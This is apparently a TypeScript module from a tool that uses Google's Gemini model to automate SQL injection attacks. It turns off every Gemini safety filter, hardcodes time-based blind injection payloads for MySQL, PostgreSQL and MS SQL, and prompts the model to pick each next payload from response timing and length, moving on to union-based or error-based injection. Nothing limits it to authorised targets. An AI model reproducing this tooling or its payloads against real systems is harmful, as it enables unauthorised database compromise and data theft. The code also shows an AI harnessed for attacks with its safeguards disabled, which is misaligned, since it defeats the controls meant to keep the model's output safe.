// src/services/ai.ts (النسخة النهائية - المحلل الأمني)

import { GoogleGenerativeAI, HarmCategory, HarmBlockThreshold, ChatSession } from "@google/generative-ai";

if (!process.env.GEMINI_API_KEY) {
    throw new Error("GEMINI_API_KEY is not defined in .env file");
}

const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);

const safetySettings = [
    { category: HarmCategory.HARM_CATEGORY_HARASSMENT, threshold: HarmBlockThreshold.BLOCK_NONE },
    { category: HarmCategory.HARM_CATEGORY_HATE_SPEECH, threshold: HarmBlockThreshold.BLOCK_NONE },
    { category: HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT, threshold: HarmBlockThreshold.BLOCK_NONE },
    { category: HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT, threshold: HarmBlockThreshold.BLOCK_NONE },
];

const model = genAI.getGenerativeModel({ model: "gemini-2.5-flash", safetySettings });


/**
 * يبدأ جلسة محادثة جديدة مع Gemini.
 * @param technologyContext - سياق التقنية المستخدمة في الهدف.
 * @returns جلسة محادثة (ChatSession).
 */
export function startSqliExploitationChat(technologyContext: string): ChatSession {
    console.log("[AI Service] Starting new intelligent conversational exploitation session.");
    
    // تحديد أول حمولة ذكية بناءً على السياق لتقليل المحاولات.
    let initialPayload = `'`; 
    if (technologyContext.toLowerCase().includes('mysql') || technologyContext.toLowerCase().includes('mariadb')) {
        initialPayload = `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1`; // حمولة عمياء زمنية لـ MySQL/MariaDB
    } else if (technologyContext.toLowerCase().includes('postgresql')) {
        initialPayload = `' AND 1=pg_sleep(5) --`; // حمولة عمياء زمنية لـ PostgreSQL
    } else if (technologyContext.toLowerCase().includes('mssql') || technologyContext.toLowerCase().includes('microsoft')) {
        initialPayload = `' WAITFOR DELAY '0:0:5' --`; // حمولة عمياء زمنية لـ MS SQL
    }

    const initialPrompt = `
        You are a highly skilled, silent, and precise **Conversational Security Analyst**. Your primary goal is to exploit SQL Injection vulnerabilities using minimal attempts.
        The target's technology stack is: ${technologyContext}.
        
        I will provide feedback on each attempt in this **RICH FORMAT**:
        "Input 'X' gave: Status Y, Time Zms, Length L. (Baseline: Status A, Time Bms, Length C). Analyze and suggest next payload or conclude."
        
        **Your ONLY task is to respond with a single, valid JSON object.**
        
        **Decision Criteria:**
        1. **TIME-BASED VULNERABILITY:** If 'Time Zms' is significantly higher (e.g., > ${initialPayload.includes('5') ? '4000' : '100'}ms delay) than 'Time Bms', assume a confirmed blind vulnerability. Your next action is to set **"finished": true** as the vulnerability is confirmed.
        2. **BOOLEAN/ERROR-BASED HINT:** If 'Length L' or 'Status Y' changes significantly compared to the baseline, assume SQL syntax was successfully manipulated. Pivot to a Union-Based payload or Error-Based probing.
        3. **NO VULNERABILITY:** If the status, time, and length remain constant after several logical attempts, set **"finished": true**.
        
        Begin. Provide the first input string based on the known technology stack.
        
        Example of a valid response:
        {"payload": "${initialPayload}", "finished": false}
    `;
    
    // نرسل أول حمولة ذكية (Time-Based) مباشرةً في الـ History لتبدأ المحادثة بشكل احترافي.
    return model.startChat({
        history: [{ role: "user", parts: [{ text: initialPrompt }] }],
        generationConfig: {
            maxOutputTokens: 2048, // 🔁 زيادة الحد إلى 2048 لضمان اكتمال الردود
            temperature: 0.1,      
        },
    });
}

/**
 * يرسل التغذية الراجعة الغنية إلى Gemini ويطلب الحمولة التالية.
 * @param chat - جلسة المحادثة الحالية.
 * @param feedback - نتيجة تجربة الحمولة السابقة (بما في ذلك الوقت والطول).
 * @returns كائن يحتوي على الحمولة التالية وما إذا كانت المهمة قد انتهت.
 */
export async function getNextSqlPayload(chat: ChatSession, feedback: string): Promise<{ payload: string | null; finished: boolean }> {
    // الكود هنا يبقى كما هو مع تعديل بسيط في تسجيل الأخطاء
    console.log(`[AI Service] Sending RICH feedback to Gemini: "${feedback.substring(0, 150)}..."`);
    try {
        const result = await chat.sendMessage(feedback);
        const response = result.response;

        // ... (كود تسجيل الرد الخام يبقى كما هو)

        const responseText = response.text();
        
        // الكود المساعد لاستخراج JSON من الرد يبقى كما هو لضمان المرونة
        const jsonMatch = responseText.match(/{[\s\S]*}/);
        if (!jsonMatch) {
            console.error("[AI Service] Gemini response did not contain valid JSON or was incomplete.", { responseText });
            return { payload: null, finished: true };
        }
        
        const cleanedJson = jsonMatch[0];
        const responseJson = JSON.parse(cleanedJson);

        return {
            payload: responseJson.payload || null,
            finished: responseJson.finished || false,
        };
    } catch (error) {
        console.error("[AI Service] Error processing Gemini's response:", error);
        return { payload: null, finished: true };
    }
}